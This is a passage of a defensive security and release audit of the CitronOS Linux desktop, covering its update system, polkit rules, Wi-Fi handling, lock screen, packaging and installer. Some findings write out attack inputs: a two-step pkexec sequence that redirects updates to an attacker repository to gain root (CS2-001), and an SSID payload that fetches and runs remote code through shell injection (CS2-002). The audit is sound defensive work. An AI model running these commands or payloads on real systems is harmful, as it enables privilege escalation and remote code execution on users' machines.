# CitronOS 2 "Club Soda": Backend, Security, Performance and Release Audit

Audit date: 2026-10-24. Branch `claude/linux-macos-golden-gate-ui-pckc7s` at `ae8cbf4`
(the CitronOS shell, after MacShell was reverted). Everything here was read from the
code at that commit. UI findings are in [02-UI-UX-AUDIT.md](02-UI-UX-AUDIT.md). The
same `CS2-` numbering runs through both documents.

## How this was checked, and what wasn't

- **Read:** every shell surface (`shell/`), the shared component store (`apps/lib/`), the
  Settings panes and helpers, all app backends (`apps/*/helper.py` and the others), the
  Hyprland config, session start-up, the archiso profile and `build.sh`, `scripts/install.sh`,
  the update system (`apps/settings/golden_update.py`, `update-helper.py`), the polkit
  policy and rules, and the CI workflows.
- **Run:** every test under `tests/` in this container (Python 3.11, PySide6 6.11.2,
  Node 22, `xvfb-run`). Results are in the [baseline](#test-baseline) below.
- **Measured:** the cost of one preference write through `gg-pref` (see CS2-023).
- **Not possible here:** this container has no GPU, Hyprland, Quickshell, Bluetooth,
  Wi-Fi or audio hardware. Nothing involving frame pacing, memory use, GPU load or
  hardware behaviour was measured. Such findings are marked **Suspected** and come with
  the measurement that would settle them.

Status values: **Confirmed** (code path read end to end, or reproduced), **Partially
verified** (code confirmed, runtime effect inferred from documented upstream behaviour),
**Suspected** (plausible from the code, not measured), **Not testable here**.

## Test baseline

All 135 test files were run once (`tests/*.py`, `tests/*.mjs`). 125 passed, and the other
ten failed for reasons that come from this environment, not from the code:

| Result | Tests | Why |
|---|---|---|
| Pass (125) | every test not listed below | — |
| Needs input (8) | `darling-build-modes`, `darling-core-utis`, `darling-dyld-link`, `darling-fsevents-build`, `darling-patches`, `darling-sincos`, `darling-window-levels`, `darling-x11-close` | Each takes a Darling source checkout as its argument. `darling-gui.yml` supplies one; run bare here, they exit with a usage error. |
| Environment (1) | `native-browser` (9 of 11 cases) | Web refuses to start as root ("Run Web as your desktop user, not root"), by design. This container runs as root; CI runs as an unprivileged user. |
| Needs build (1) | `appearance-contracts` (1 of its subtests) | Checks generated symbol files (`missing app asset for volume-x`). CI runs `npm run build` first, which wasn't run here because it rewrites tracked files. |

So the suite is green, but it says less than it seems. About 150 of the CI checks in
`check.yml` (lines 38–118) are `grep -q` string-presence guards, not behaviour tests (see CS2-033).
None of the P0 findings below is caught by any test.

---

## P0: critical

### Finding ID: CS2-001

**Area:** Software Update / privileges
**Category:** Security, Architecture
**Severity:** P0
**Current implementation:** Software Update runs one root helper,
`/usr/share/golden-gate/apps/settings/update-helper.py`, under the polkit action
`org.goldengate.update`. The rule `49-golden-gate-update.rules` returns `polkit.Result.YES`
for any local, active member of `wheel`, so no password is asked. The helper accepts five
subcommands, among them `set-source` (choose the GitHub repository and branch updates
come from) and `apply` (download that branch's newest commit and run its
`scripts/install.sh --system` as root).
**Evidence:**
- `distro/archiso/overlay/etc/polkit-1/rules.d/49-golden-gate-update.rules:4-8`: the
  passwordless rule. Its comment says the helper "only refreshes and upgrades the installed
  packages (pacman -Syu) and Flatpak apps", which is no longer true.
- `distro/archiso/overlay/usr/share/polkit-1/actions/org.goldengate.update.policy`:
  `exec.path` covers the whole helper, whatever its arguments.
- `apps/settings/update-helper.py:277-297` (`set_source`) and `:300-302` (dispatch).
- `apps/settings/golden_update.py:795-830` (`install_tree` runs the downloaded
  `scripts/install.sh` as root).
- The rule is not in `LIVE_ONLY` (`golden_update.py:79-83`), so installed systems keep it.

**Problem:** Any process running as the signed-in administrator can gain root without a
password: a downloaded script, an npm `postinstall`, a malicious Mac app under Darling,
anything outside a sandbox. Two steps are enough:
`echo '{"repo":"attacker/repo","branch":"main"}' | pkexec …/update-helper.py set-source`,
then `pkexec …/update-helper.py apply`. The second step downloads the attacker's tarball
and runs its `install.sh` as root.
**Root cause:** Confirmed. A single polkit action covers both a low-risk operation
(`pacman -Syu`) and two high-risk ones (change the trusted source, execute fetched code).
polkit cannot tell argv apart under one `exec.path` action.
**User impact:** Any code running as the user can become root silently. Full machine
compromise.
**Recommended solution:**
1. Split the helper into separate executables with separate actions:
   `org.goldengate.update.packages` (pacman/flatpak only; may stay passwordless),
   `org.goldengate.update.citronos` (`auth_admin_keep`) and
   `org.goldengate.update.source` (`auth_admin`, never cached, never in the rule).
2. Remove `set-source` and `apply` from anything the passwordless rule matches.
3. Longer term, CS2-003 replaces "run install.sh from a tarball" with signed packages, which
   removes the code-execution path entirely.

**Alternative approaches:** Keep one helper but check `PKEXEC_UID` and re-prompt through a
second `pkexec` for `set-source`. This is weaker, because the rule still covers `apply`.
**Complexity:** Small (split and rule change), Large (with CS2-003).
**Dependencies:** CS2-003 for the complete fix.
**Validation:** As a wheel user in a VM, `pkexec update-helper.py set-source` must prompt for
a password, and `apply` must refuse a source that isn't the signed release channel. Add
`tests/update-privileges.py`: parse the rules file and the policy, and assert that no
passwordless action's `exec.path` accepts `set-source` or runs downloaded code.
**Status:** Confirmed (code read). Not exercised on an installed machine.

### Finding ID: CS2-002

**Area:** Control Center / Wi-Fi
**Category:** Security
**Severity:** P0
**Current implementation:** Tapping a network in Control Center calls
`joinNetwork(ssid)`. This builds one shell string with the SSID appended through
`JSON.stringify`, then passes it to `Hyprland.dispatch("exec " + cmd)`, which Hyprland runs
through `/bin/sh -c`.
**Evidence:** `shell/ControlCenter.qml:106-109`.
```
cc.run("sh -c 'nmcli … connection up id \"$1\" … || gg-settings wifi' sh " + JSON.stringify(ssid))
function run(cmd) { Hyprland.dispatch("exec " + cmd) }
```
**Problem:** `JSON.stringify` wraps the SSID in double quotes but does not escape `$`,
`` ` `` or `\`. Inside double quotes the outer shell still runs `$(…)` and backticks.
Anyone within radio range can broadcast an SSID such as `$(curl -s x.io|sh)`; SSIDs are
up to 32 bytes, which is plenty. The SSID comes from `nmcli … wifi list`
(`ControlCenter.qml:185-199`). When the user taps it, the command runs as the user.
**Root cause:** Confirmed. Untrusted radio data is spliced into a shell command line.
`run()` has no argv form.
**User impact:** Remote code execution from a nearby attacker after one tap, for example
in a café, at an airport or at a conference.
**Recommended solution:** Never build shell strings around external data. Replace
`joinNetwork` with
`Quickshell.execDetached(["gg-wifi-join", ssid])`, where `gg-wifi-join` is a small script
that calls `nmcli` with argv only, or with a NetworkManager D-Bus call (see CS2-016).
Delete `run(cmd)` and turn its other callers (`:56`, `:124`, `:128`, `:252`, `:265`,
`:1056`, `:1071`) into argv `execDetached` calls. Do the same for
`apps/lib/ZoomMenu.qml:26`.
**Alternative approaches:** Quote with single quotes and escape `'`. This is fragile and
easy to break again.
**Complexity:** Small.
**Dependencies:** None.
**Validation:**
- A unit test that loads `ControlCenter.qml` in the preview harness, calls `joinNetwork`
  with `$(touch /tmp/pwned)`, and asserts that no file appears and the argv seen by a
  stub `nmcli` is literal.
- A lint test that fails on any `dispatch("exec " +` or `"sh", "-c", … +` with
  non-constant data.

**Status:** Confirmed (code read). Hyprland's `exec` is documented to run through `sh -c`.
Not run against a live access point.

### Finding ID: CS2-003

**Area:** Updates / release engineering
**Category:** Security, Architecture
**Severity:** P0
**Current implementation:** CitronOS updates itself from the newest commit of a git
branch on GitHub. The default branch is the development branch
`claude/linux-macos-golden-gate-ui-pckc7s`. The update downloads the commit tarball and
runs its `scripts/install.sh --system` as root. The download's integrity rests only on TLS
to `api.github.com`. Nothing is signed, nothing is versioned, there is no staged rollout,
and the "version" recorded is a commit hash.
**Evidence:**
- `apps/settings/golden_update.py:1-41` (design), `:64-66` (`DEFAULT_REPO`,
  `DEFAULT_BRANCH`), `:338-370` (`download`/`unpack`), `:795-930` (`install_tree`).
- `Release.qml` holds a marketing version (3.5) that the update path never consults.

**Problem:**
1. Every push to the development branch is immediately offered to every installed
   machine and runs as root on the next update. A broken commit, a half-finished
   experiment, or a compromised GitHub account or token with push access becomes root
   code on users' machines.
2. There is no way to ship a fix to "stable" without also shipping whatever else is on the
   branch.
3. The rollback (`Rollback`, `:683-756`) restores files but not packages, and it is not a
   filesystem snapshot.

**Root cause:** Confirmed. The update channel is "git HEAD", not "release".
**User impact:** Unpredictable breakage on update, and a single point of compromise for
the whole installed base.
**Recommended solution:** Ship CitronOS as signed pacman packages from a CitronOS
repository (CS2-011).
- Build in CI from tagged releases, and sign packages and the repository database with a
  CitronOS key that `archlinux-keyring`-style trust delivers (`citronos-keyring` package).
- Software Update then becomes `pacman -Syu`, plus Flatpak, plus an optional
  pre-update snapshot (CS2-012).
- Keep the `stable`, `beta` and `dev` channels as three repositories. Only `dev` may
  track a branch.

**Alternative approaches:**
1. Keep tarballs but publish signed release bundles (`minisign`/`ssh-keygen -Y sign`)
   that `golden_update.py` verifies against a key pinned in `/usr/share/golden-gate/`.
   This is the smallest safe step and fits as an interim measure for M1.
2. OSTree or an image-based A/B layout. This is a big re-architecture with a poor fit to
   Arch.

**Complexity:** Medium (signed bundles) or Large (package repository).
**Dependencies:** CS2-001, CS2-011, CS2-038.
**Validation:**
- An update test with a stand-in GitHub (`GG_UPDATE_API`) that serves an unsigned or
  wrongly signed bundle must refuse it.
- A signed bundle installs.
- Changing `DEFAULT_BRANCH` must not change which code a `stable` machine installs.

**Status:** Confirmed (code read).

---

## P1: high

### Finding ID: CS2-004

**Area:** Desktop shell / start-up
**Category:** Performance, Reliability
**Severity:** P1
**Current implementation:** Launchpad (`Applications.qml`) and the tablet Home Screen
load app icons with `asynchronous: true`. Their sources come from `Quickshell.iconPath()`,
which returns `image://icon/…` URLs.
**Evidence:**
- `shell/Applications.qml:488-491` and `shell/TabletHome.qml:416-419`.
- Launchpad is created and mapped at login (`visible: true`, `Applications.qml:166`), so all
  of its icons load during start-up.

**Problem:** This pattern was found to crash Quickshell 0.3.2 on Qt 6.12. With an
asynchronous Image, the `image://icon` provider calls `QIcon::pixmap()` on the image
loader thread, and that crashed with "pure virtual method called" in `QPixmap::load`. It
was measured as 2 crashed starts in 6 on the MacShell branch and fixed there (commit
`24db0a5`: 12 of 12 clean starts over two runs). That fix was reverted with MacShell in
`ae8cbf4`, and the same pattern is present here.
**Root cause:** Confirmed for MacShell, where it was reproduced and fixed. Partially
verified here: the identical pattern is in the code, but the crash wasn't re-run on this
shell.
**User impact:** Some logins crash the desktop. The restart loop (CS2-006) hides it as a
2-second blank.
**Recommended solution:** Use
`asynchronous: !String(source).startsWith("image://")` (or `false`) wherever the source can
come from `iconPath`. Put this in one shared `AppIcon.qml` in `apps/lib/` and use it from
the Dock, Launchpad, Tablet Home, Mission Control, Spotlight and Notifications. Add the
regular-expression guard to `tests/qml-regressions.py`, as `24db0a5` did.
**Alternative approaches:** Give icons a file-path resolver, so the shell never uses
`image://icon` (the icon resolver already writes an approved list), and keep async loads.
**Complexity:** Small.
**Dependencies:** None.
**Validation:** Restore crash detection in `tests/shell-shots.sh` (also reverted): check
the shell is alive and that no report exists in `~/.cache/quickshell/crashes`. Run 10 cold
starts in CI, all clean.
**Status:** Partially verified.

### Finding ID: CS2-005

**Area:** Lock screen
**Category:** Reliability, Security
**Severity:** P1
**Current implementation:** The lock screen (`ext-session-lock` plus PAM) is a component
of the one Quickshell process that also draws the Dock, menu bar, Control Center, glass,
widgets and Citron.
**Evidence:**
- `shell/shell.qml:189` loads `LockScreen.qml` in-process. `shell/LockScreen.qml:24-27`
  provides `ipc call lock lock`.
- `compositor/hyprland/hyprland.conf` doesn't set `misc:allow_session_lock_restore`.
- The supervisor loop restarts `qs` but never re-locks (`hyprland.conf:49`).

**Problem:** If anything in the shell crashes while the screen is locked (CS2-004 is one
known cause), the locking client dies. Hyprland correctly keeps the session locked, but it
shows its "lockscreen died" screen. Without `allow_session_lock_restore`, the restarted
shell cannot take the lock back, and the user cannot unlock without a TTY.
**Root cause:** Partially verified. The config and code are confirmed. The post-crash
behaviour is Hyprland's documented handling of a dead lock client.
**User impact:** A locked laptop that can't be unlocked, which looks like data loss to most
people.
**Recommended solution:**
1. Run the lock screen as its own Quickshell config (`qs -c golden-gate-lock`), started by
   `hypridle`'s `lock_cmd` and `loginctl lock-session`. It then shares no process with the
   rest of the shell.
2. Set `misc:allow_session_lock_restore = true` and add a systemd user unit that relaunches
   the lock client when logind's `LockedHint` is true.

**Alternative approaches:** `hyprlock`, themed to match. It is mature but loses the
shared QML lock design.
**Complexity:** Medium.
**Dependencies:** CS2-006.
**Validation:** Lock, then `kill -SEGV` the lock process. Within 3 s a new lock surface must
appear and accept the password. Add this to the ISO boot test (`boot-test.yml`).
**Status:** Partially verified.

### Finding ID: CS2-006

**Area:** Session / process supervision
**Category:** Architecture, Reliability
**Severity:** P1
**Current implementation:** Long-running user services are `sh -c 'while :; do …; done'`
loops in Hyprland's `exec-once`: the shell itself (with home-made 4 MB log rotation) and
the AirDrop daemon. One Quickshell process hosts every shell surface, the notification
server, the lock screen and the OSD. Only CitronPods and AirPlay have systemd user units.
**Evidence:**
- `compositor/hyprland/hyprland.conf:49` (shell loop: restart every 2 s forever, no
  back-off, no crash counting).
- `:56` (AirDrop loop). `shell/shell.qml:165-190` (everything in one process).
- `apps/citronpods/citronpods-daemon.service` shows the better pattern already in the repo
  (`Restart=on-failure`, `StartLimitBurst`).

**Problem:**
1. A crash-looping shell restarts every 2 s indefinitely and logs to a file the journal
   doesn't see.
2. One fault in any surface takes down notifications, the lock screen, the Dock and the
   menu bar together.
3. None of these services can be inspected with `systemctl --user status`, restarted
   individually, ordered after PipeWire or BlueZ, or resource-limited.

**Root cause:** Confirmed. There is no session service manager.
**User impact:** Flicker or a dead desktop on faults. Hard to diagnose.
**Recommended solution:** Start a `citronos-session.target` (bound to
`graphical-session.target`) from `gg-session` with units for:
- `citronos-shell.service` (`Restart=on-failure`, `RestartSec=1`, `StartLimitBurst=5`, then a
  fallback "safe shell" without glass);
- `citronos-lock.service` (CS2-005);
- `citronos-notifyd.service` (CS2-024);
- `citronos-airdrop.service`;
- `citronos-icon-resolver.service`.

Log to the journal. Use `uwsm` or the `hyprland-session.target` pattern to reach
`graphical-session.target` from a TTY start.
**Alternative approaches:** Keep `exec-once`, but add back-off and crash counting to the
loops. This is cheaper but keeps every other problem.
**Complexity:** Medium.
**Dependencies:** CS2-005, CS2-024.
**Validation:** `systemctl --user list-units 'citronos-*'` shows all units active. Killing the
shell five times within a minute lands on the safe shell and raises a notification. The
journal holds the shell log.
**Status:** Confirmed.

### Finding ID: CS2-007

**Area:** Liquid Glass / shell rendering
**Category:** Performance
**Severity:** P1
**Current implementation:** Every glass shell surface embeds `DesktopBackdrop`. When the
`glassWindows` preference is on (the default), the backdrop shows live `ScreencopyView`
captures of the windows under the surface, takes a new frame every 33 ms, and calls
`Hyprland.refreshToplevels()` every 100 ms while a window is underneath (every 500 ms
otherwise). Nineteen surfaces embed it, and the Dock and menu bar are always on screen.
**Evidence:**
- `shell/components/Prefs.qml:22` (`glassWindows` defaults to `true`).
- `shell/components/DesktopBackdrop.qml:120` (`ScreencopyView`), `:139-144` (33 ms
  capture timer), `:205-210` (100 / 500 ms toplevel polling).
- Embedded by 19 shell files (`grep -rn DesktopBackdrop shell`).

**Problem:** With a window behind the Dock, the shell copies window contents at about 30 fps
and polls Hyprland 10 times a second, even when nothing moves. On integrated GPUs and
laptops this is very likely the largest steady-state cost in the desktop, in GPU work,
memory bandwidth and battery. The compositor's own blur is already behind each surface.
**Root cause:** Suspected (cost not measured; no GPU here). The design is confirmed.
**User impact:** Battery drain, fan noise and dropped frames on modest hardware, plus a
cost that grows with each monitor.
**Recommended solution:**
1. Make the live-window lens opt-in ("Refract windows", off by default), or limit it to
   surfaces that are open briefly (Control Center, Spotlight, menus), not the permanent
   Dock and menu bar.
2. Capture only on damage: subscribe to the toplevel's frame events instead of a 33 ms
   timer, and stop capturing while the screen is idle.
3. Fall back automatically on `GraphicsInfo.api === Software`, and when on battery with
   Low Power on.

**Alternative approaches:** Move the refraction into HyprGlass (compositor side, where the
pixels already are). It's cheaper, but it ties the look to the plugin ABI problem
(CS2-009).
**Complexity:** Medium.
**Dependencies:** A performance harness (M0 baseline task T-0.3).
**Validation:** On an Intel iGPU laptop with one window behind the Dock, measure idle
package power (`turbostat`/`powertop`) and shell GPU time (`intel_gpu_top`) with the
option on and off. The target is under 1 % shell CPU at idle and no measurable GPU busy
time at idle.
**Status:** Suspected.

### Finding ID: CS2-009

**Area:** Compositor plugin (HyprGlass)
**Category:** Architecture, Release
**Severity:** P1
**Current implementation:** HyprGlass, which draws the glass blur and refraction for every
shell layer, is a prebuilt `.so` pinned to Hyprland 0.56.2 by version and SHA-256. The ISO
build fails if the Arch repositories carry any other Hyprland. On installed systems,
`gg-hyprglass-sync` refuses to load a mismatched plugin.
**Evidence:**
- `distro/archiso/build.sh:189-203` (`HYPRGLASS_HYPRLAND="0.56.2"`, exits on mismatch).
- `apps/settings/golden_update.py:519-587` (`update_hyprglass`, `glass_notice`).

**Problem:** Arch is rolling. Each Hyprland release breaks the ISO build until someone
updates the pin, and each `pacman -Syu` that brings a new Hyprland turns the glass off on
users' machines until a matching plugin ships. The look of the OS depends on two
third-party projects releasing in lock-step.
**Root cause:** Confirmed. A binary C++ plugin is tied to an unstable ABI.
**User impact:** The OS's signature look disappears after routine updates. ISO builds are
blocked by upstream timing.
**Recommended solution:**
1. Pin Hyprland in the CitronOS repository: ship `citronos-hyprland` plus a matching
   `citronos-hyprglass` built from source in CI (CS2-011), and set `IgnorePkg`-style holds
   so that `pacman -Syu` moves both together.
2. Build HyprGlass from source against the exact Hyprland headers (as `hyprbars` already is,
   `build.sh:206-215`) instead of downloading a binary.

**Alternative approaches:**
1. Do all glass in QML (CS2-007's lens already exists) and use only stock Hyprland blur.
   This removes the ABI risk and costs some fidelity.
2. Use `hyprpm`. It still breaks on each release and needs build tools on the user's
   machine.

**Complexity:** Medium.
**Dependencies:** CS2-011.
**Validation:** Simulate an Arch Hyprland bump in CI (build against `hyprland-git`
headers). The pipeline must either produce a matched pair or hold both back. It must never
ship an ISO or update without glass.
**Status:** Confirmed.

### Finding ID: CS2-010

**Area:** ISO build
**Category:** Release
**Severity:** P1
**Current implementation:** `build.sh` installs whatever the Arch mirrors carry that day.
Missing packages (`quickshell`, `uxplay`, `gnome-network-displays`) are cloned from AUR
`HEAD` with no commit pin and built. The resulting local repository is trusted with
`SigLevel = Optional TrustAll`. BlueFerry (tag `v0.8.1`) and HyprGlass (SHA-256) are the
only pinned inputs.
**Evidence:** `distro/archiso/build.sh:128-161` (AUR clone, unpinned), `:176` (SigLevel),
`:107` (BlueFerry tag), `:189-203` (HyprGlass).
**Problem:** Two builds of the same commit can produce different operating systems. A
changed AUR PKGBUILD runs on the build machine and its output ships unreviewed. When a
user reports a bug against an ISO, you can't rebuild that ISO.
**Root cause:** Confirmed.
**User impact:** Regressions you can't bisect. Supply-chain exposure through AUR
maintainers.
**Recommended solution:**
1. Pin the Arch repositories to a dated Arch Linux Archive snapshot
   (`Server = https://archive.archlinux.org/repos/YYYY/MM/DD/$repo/os/$arch`), stored in the
   repo and bumped deliberately.
2. Vendor or pin the AUR PKGBUILDs by commit, with checksums.
3. Sign the local repository.
4. Write a build manifest (package list with versions, input hashes) into the ISO and
   `/usr/share/golden-gate/build-manifest.json`.

**Alternative approaches:** Build the AUR dependencies once into the signed CitronOS
repository (CS2-011) and consume them like any other package. This is the preferred end
state.
**Complexity:** Medium.
**Dependencies:** CS2-011.
**Validation:** Two clean CI builds of the same commit must produce an identical package
manifest, compared with `diffoscope` on the manifest.
**Status:** Confirmed.

### Finding ID: CS2-011

**Area:** Packaging
**Category:** Architecture, Release
**Severity:** P1
**Current implementation:** `scripts/install.sh` copies CitronOS into `/usr/share/golden-gate`,
`/usr/local/bin`, `/usr/lib/golden-gate`, `/etc/skel` and every account's `~/.config`. Arch
dependencies are a hand-kept list (`distro/archiso/packages.x86_64`). pacman owns none of
CitronOS's files.
**Evidence:** `scripts/install.sh` (543 lines); `golden_update.py:472-506`
(`refresh_accounts` rewrites users' dotfiles, keeping `NAME.golden-gate-new` beside files
the user edited).
**Problem:**
1. `pacman -Qo` can't tell what a file belongs to, and pacman can't detect conflicts.
2. Dependencies are not enforced: a user can `pacman -R` something CitronOS needs.
3. Uninstalling is impossible.
4. The update path has to reinvent install, rollback and file ownership in Python (about
   1,100 lines in `golden_update.py`).
5. Per-user copies of the shell under `~/.config/quickshell` mean every account carries a
   copy of the OS that must be kept in sync.

**Root cause:** Confirmed.
**User impact:** Fragile updates. Systems drift apart over time.
**Recommended solution:** Write PKGBUILDs:
- `citronos-runtime`: `/usr/share/golden-gate`, `/usr/lib/golden-gate`, bin wrappers in
  `/usr/bin`, not `/usr/local`;
- `citronos-shell`: the shell, as a system Quickshell config in `/etc/xdg/quickshell/golden-gate`
  rather than per-user copies;
- `citronos-apps`, `citronos-theme`, `citronos-hyprland-config`, `citronos-keyring`, and
  `citronos` (a meta package with real `depends=`).

Ship user defaults as `/etc/xdg` files that user files override, so updates never rewrite
`~/.config`.
**Alternative approaches:** Keep `install.sh` for development checkouts only and generate
the packages from it.
**Complexity:** Large.
**Dependencies:** None. CS2-003, CS2-009 and CS2-010 depend on it.
**Validation:**
- `pacman -Qkk citronos-*` is clean.
- `pacman -R citronos-shell` refuses while `citronos` is installed.
- A fresh account has no `~/.config/quickshell` and still gets the shell.
- An update changes no file under `/home`.

**Status:** Confirmed.

### Finding ID: CS2-012

**Area:** Installer
**Category:** Feature gap, Security
**Severity:** P1
**Current implementation:** The installer erases a whole disk, creates FAT32 `/boot` plus
an ext4 root, copies the live root filesystem, provisions one account and installs
systemd-boot. It is UEFI only.
**Evidence:** `apps/installer/helper.py:299-324` (UEFI check, `mkfs.fat`, `mkfs.ext4`),
`:404-409` (account, wheel sudoers), `:466-523` (initramfs, `bootctl`, `genfstab`). There is
no swap, zram, LUKS or partition-preserving path anywhere in `apps/installer*`.
**Problem:**
1. No disk encryption. A stolen laptop gives away all of its data.
2. No swap or zram. Memory pressure leads to the OOM killer, and hibernation is impossible.
3. No way to install alongside Windows or another Linux.
4. ext4 rules out the snapshots that CS2-003's safe updates would want.

**Root cause:** Confirmed (scope of the implementation).
**User impact:** Unsafe defaults for laptops. Some users can't install at all.
**Recommended solution:**
- Add "Encrypt this disk" (LUKS2 + `sd-encrypt` + systemd-boot; on by default on laptops)
  and zram (`zram-generator`, on by default).
- Use btrfs with `@` and `@home` subvolumes, plus `snapper` or `snap-pac`, for pre-update
  snapshots that the boot menu can roll back to.
- Add "Install alongside": shrink an existing partition only after `ntfsresize --check`,
  never on BitLocker, and reuse the existing EFI system partition.

**Alternative approaches:** Calamares, which is mature and supports all of these but
doesn't look like CitronOS. Or `archinstall` as the back end with the CitronOS UI kept.
**Complexity:** Large.
**Dependencies:** CS2-003 for snapshot-aware updates.
**Validation:**
- QEMU (OVMF) installs with encryption on and off, alongside a Windows image (a test fixture)
  and with zram.
- After install: `lsblk` shows `crypt`, `zramctl` is active, and a failed update can be
  rolled back from the boot menu.

**Status:** Confirmed.

### Finding ID: CS2-014

**Area:** Bluetooth
**Category:** Backend
**Severity:** P1
**Current implementation:** The shell reads Bluetooth state through BlueZ D-Bus
(`Quickshell.Bluetooth`) but writes it with the `bluetoothctl` CLI. Settings pairs with
`bluetoothctl pair MAC && trust && connect` and parses `bluetoothctl` text output. No pairing
agent is registered.
**Evidence:** `shell/ControlCenter.qml:646-647` and `:868-871`;
`apps/settings/panes/BluetoothPane.qml:1-2`, `:20-37` (text scraping), `:46-50` (pair).
**Problem:**
1. Devices that need a passkey or PIN confirmation (keyboards, many headsets, phones)
   can't pair, because nothing answers the agent's request.
2. Two back ends can disagree about the same state.
3. The scan is a 7-second blocking `bluetoothctl --timeout 7 scan on`.

**Root cause:** Confirmed (no agent in the code). The failure on PIN devices follows from
how BlueZ pairing works.
**User impact:** "Couldn't pair" for common accessories.
**Recommended solution:**
- Run one BlueZ client in Python with `dbus-next`, which is already a dependency:
  `citronos-bluetoothd`, a user service exposing `org.citronos.Bluetooth1`.
- Register an `org.bluez.Agent1` that forwards `RequestConfirmation`, `RequestPasskey` and
  `DisplayPinCode` to a shell sheet.
- Settings and Control Center both use it. CitronPods (CS2-029) and the proximity card
  (`Nearby.qml`) hang off the same service.

**Alternative approaches:** Use `Quickshell.Bluetooth` for everything (it has pairing in
recent versions). Check for an agent API first.
**Complexity:** Medium.
**Dependencies:** CS2-006 (service supervision).
**Validation:** Pair a Bluetooth keyboard (passkey entry) and a phone (numeric comparison)
on real hardware. Add an integration test against `bluez` running in a `dbus-run-session`
with the `btvirt` virtual controller.
**Status:** Confirmed (static). Not testable here (no Bluetooth controller).

### Finding ID: CS2-015

**Area:** Mail
**Category:** Feature gap, Backend
**Severity:** P1
**Current implementation:** Mail is one IMAP/SMTP account with a keyring password. Each
listing opens a new connection, selects INBOX read-only and fetches the last 80 headers.
Sending builds a plain-text message and calls `send_message`.
**Evidence:** `apps/mail/helper.py:2` (one manual account), `:509-560` (`cmd_list`: INBOX,
`[-80:]`, no local cache), `:615-633` (`cmd_send`: text only, no attachments, no
`In-Reply-To`/`References`, no copy to Sent); `CONFIG = …/mail.json` (one account).
**Problem:**
- No folders, server search, attachments on send, threading, Sent copies or multiple
  accounts.
- No offline cache.
- No push or background sync: the unread badge only updates while Mail runs.
- No OAuth2, so Gmail and Microsoft accounts need app passwords, which Microsoft no longer
  accepts for most consumer accounts.

**Root cause:** Confirmed (scope).
**User impact:** Mail isn't usable as an everyday client.
**Recommended solution:** Decide build-versus-integrate (see
[05-ARCHITECTURE-PROPOSAL.md](05-ARCHITECTURE-PROPOSAL.md#mail-calendar-contacts)). The
recommendation is to keep the CitronOS UI and replace the back end with Evolution Data
Server (EDS) plus GNOME Online Accounts (GOA). That gives OAuth2, IMAP IDLE, an offline
cache, folders, multiple accounts, and shared contacts and calendars (CS2-042), all over
D-Bus. A `mail-sync` user service publishes unread counts for the badge.
**Alternative approaches:** Extend the Python helper (long-lived process, IMAP IDLE, SQLite
cache, OAuth through a loopback redirect). This means maintaining an email engine
in-house.
**Complexity:** Large.
**Dependencies:** CS2-042, CS2-024.
**Validation:**
- Add a Gmail and an Outlook account through OAuth.
- Badge counts update with Mail closed.
- An attachment round-trips.
- A sent reply threads correctly in a second client.

**Status:** Confirmed.

---

## P2: medium

### Finding ID: CS2-016

**Area:** Networking
**Category:** Security, Backend
**Severity:** P2
**Current implementation:** Settings joins a secured network with
`nmcli device wifi connect SSID password PASSWORD`, which puts the password in argv. All
network state is scraped from `nmcli -t` text, and the shell polls it with fresh `nmcli`
processes.
**Evidence:** `apps/settings/panes/WifiPane.qml:44-51`; `shell/ControlCenter.qml:172-199`.
**Problem:**
1. While `nmcli` runs, any local user can read the password from `/proc/<pid>/cmdline` or
   `ps`.
2. Text scraping breaks on SSIDs with `:` or `\` (CS2-041).
3. There is no 802.1X (WPA-Enterprise), no VPN set-up (the Network pane only lists VPN
   devices, `NetworkPane.qml:39`), no captive-portal handling and no per-network settings.

**Root cause:** Confirmed.
**User impact:** Credential exposure on shared machines. Common networks can't be joined.
**Recommended solution:**
- Add a `citronos-networkd` user service on NetworkManager D-Bus (`dbus-next`). It uses
  `AddAndActivateConnection2` with secrets passed in the settings dict, signals for state
  instead of polling, and a secret agent for prompts.
- Interim fix: `nmcli --ask` with the password on stdin, or `nmcli … passwd-file /dev/stdin`.
- Add VPN import (WireGuard `.conf`, OpenVPN `.ovpn` through `nmcli connection import`)
  and 802.1X PEAP/TTLS.

**Alternative approaches:** Use `Quickshell.Networking`, if the Quickshell version shipped
provides it.
**Complexity:** Medium.
**Dependencies:** CS2-006.
**Validation:** Run `ps -eo args` in a loop during a join: no password appears. Join an
SSID containing `a:b\c`. Import a WireGuard file.
**Status:** Confirmed.

### Finding ID: CS2-017

**Area:** AirDrop
**Category:** Security
**Severity:** P2
**Current implementation:** `airdropd.py serve` starts at every login. It binds UDP and
HTTPS port 53317 on all interfaces and is discoverable by "everyone" unless changed. If
`openssl` fails it falls back to plain HTTP. The image ships no firewall.
**Evidence:**
- `compositor/hyprland/hyprland.conf:56`; `apps/airdrop/airdropd.py:319-320` (default
  `everyone`), `:322-345` (HTTPS with fallback), `:405` (`bind(("", PORT))`).
- No `nftables`, `ufw` or `firewalld` in `distro/archiso/packages.x86_64`.

**Problem:** On public Wi-Fi, every CitronOS laptop announces itself and accepts upload
requests from anyone on the network. Requests need an Accept click, but the parser and
HTTP stack are network-exposed by default. macOS defaults to "Contacts Only" and limits
"Everyone" to 10 minutes.
**Root cause:** Confirmed (configuration). Exploitability is not assessed.
**User impact:** Attack surface and request spam on untrusted networks.
**Recommended solution:**
- Default to "Receiving off". Offer "Everyone for 10 minutes" (it lapses back to off) and
  "Contacts" once Contacts exists.
- Only listen on networks NetworkManager marks as private (connection zone).
- Ship `firewalld` with the `home` and `public` zones mapped to NetworkManager connections,
  and open 53317 only in `home`.
- Refuse the HTTP fallback.

**Alternative approaches:** Socket-activate the daemon (`.socket` unit), so nothing listens
until AirDrop is opened.
**Complexity:** Small.
**Dependencies:** CS2-006.
**Validation:** After a fresh login on a "public" connection, `ss -lntup | grep 53317`
shows nothing. Turning on "Everyone for 10 minutes" opens the port and it closes on its
own.
**Status:** Confirmed.

### Finding ID: CS2-020

**Area:** Back-end code structure
**Category:** Architecture
**Severity:** P2
**Current implementation:** There are 55 Python helpers. Each re-implements the same
infrastructure: 19 separate "write to a temporary file, then `os.replace`" routines, 6
`secret-tool` wrappers with their own timeouts, 13 `emit()` JSON-line protocols, and
assorted subprocess-with-timeout code. `apps/lib/` holds QML, but no shared Python package.
**Evidence:**
- Atomic writes in `apps/archive/helper.py`, `apps/calendar/{caldav,helper,reminders}.py`,
  `apps/clock/helper.py`, `apps/files/helper.py`, `apps/mail/helper.py`,
  `apps/music/{playlists,session}.py`, `apps/notes/trash.py`, `apps/settings/*.py`,
